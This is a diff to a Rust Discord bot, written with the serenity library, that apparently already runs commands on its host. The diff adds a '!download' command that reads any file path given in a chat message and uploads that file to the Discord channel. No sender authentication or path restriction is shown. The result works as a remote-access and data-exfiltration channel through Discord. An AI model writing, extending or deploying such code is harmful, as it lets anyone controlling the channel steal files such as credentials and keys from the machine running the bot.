@@ -2,9 +2,11 @@ use std::env;
 
 use serenity::all::GatewayIntents;
 use serenity::async_trait;
+use serenity::builder::{CreateAttachment, CreateMessage};
 use serenity::model::channel::Message;
 use serenity::model::gateway::Ready;
 use serenity::prelude::*;
+use std::path::Path;
 use tokio::process::Command;
 
 struct Handler;
@@ -62,6 +64,21 @@ impl EventHandler for Handler {
                 Err(why) => {
                     println!("Error retrieving output: {why:?}");
                 }
+            }
+        }
+        if msg.content.starts_with("!download ") {
+            let file_path = msg.content.strip_prefix("!download ").unwrap_or("");
+            let path = Path::new(file_path);
+
+            if path.exists() && path.is_file() {
+                let builder =
+                    CreateMessage::new().add_file(CreateAttachment::path(path).await.unwrap());
+
+                if let Err(why) = msg.channel_id.send_message(&ctx.http, builder).await {
+                    println!("Error sending message: {why:?}");
+                }
+            } else {
+                let _ = msg.channel_id.say(&ctx.http, "File not found!").await;
             }
         }
     }
